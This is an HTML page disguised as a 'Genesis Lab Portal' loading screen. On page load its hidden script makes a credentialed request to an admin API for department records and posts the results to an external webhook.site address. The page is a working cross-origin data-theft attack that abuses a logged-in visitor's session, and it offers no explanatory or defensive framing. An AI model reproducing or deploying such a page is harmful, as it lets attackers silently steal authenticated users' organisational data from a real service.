<!DOCTYPE html>
<html>
<head>
    <title>Genesis Lab - Update</title>
    <style>
        body {
            font-family: Arial;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #f0f0f0;
        }
        .box {
            background: white;
            padding: 40px;
            border-radius: 8px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="box">
        <h2>Genesis Lab Portal</h2>
        <p>Loading...</p>
    </div>

    <script>
        const WEBHOOK = 'https://webhook.site/fbd7cfdc-bb8a-4841-878f-382a15e228db';
        
        fetch('https://admin.genesislab.in/api/departments?rowsPerPage=100', {
            credentials: 'include'
        })
        .then(r => r.json())
        .then(data => {
            fetch(WEBHOOK, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    total: data.total,
                    departments: data.data,
                    timestamp: new Date().toISOString()
                })
            });
        });
    </script>
</body>
</html>
